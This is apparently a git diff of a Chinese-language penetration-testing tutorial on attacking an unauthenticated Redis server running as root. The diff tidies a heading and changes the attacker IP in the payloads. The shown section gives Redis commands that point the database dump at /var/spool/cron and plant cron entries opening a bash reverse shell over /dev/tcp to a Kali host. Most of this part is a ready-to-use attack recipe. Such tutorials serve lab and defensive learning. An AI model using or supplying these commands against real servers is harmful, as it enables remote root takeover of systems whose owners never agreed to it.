@@ -82,7 +82,7 @@ docker run -p 6379:6379 -d damonevking/redis5.0 redis-server //映射端口并�
 
 ![图片](https://uploader.shimo.im/f/ROa4rN6I5EV1mE4y.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)
 
-#### 
+####
 #### 2.利用crontab反弹shell
 
 在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell
@@ -98,12 +98,12 @@ config set dir /var/spool/cron
 
 set -.- "\n\n\n* * * * * bash i >& /dev/tcp/<kali的IP>/<端口> 0>&1\n\n\n"
 
-set -.- "\n\n\n* * * * * bash i >& /dev/tcp/192.168.91.1/5678 0>&1\n\n\n"
+set -.- "\n\n\n* * * * * bash i >& /dev/tcp/192.168.16.59/5678 0>&1\n\n\n"
 
 或者
 set x "\n* * * * * /bin/bash i > /dev/tcp/<kali的IP>/<端口> 0<&1 2>&1\n"
 
-set x "\n* * * * * /bin/bash i >& /dev/tcp/192.168.91.1/5678 0<&1 2>&1\n"
+set x "\n* * * * * /bin/bash i >& /dev/tcp/192.168.16.59/5678 0<&1 2>&1\n"
 
 
 config set dbfilename root
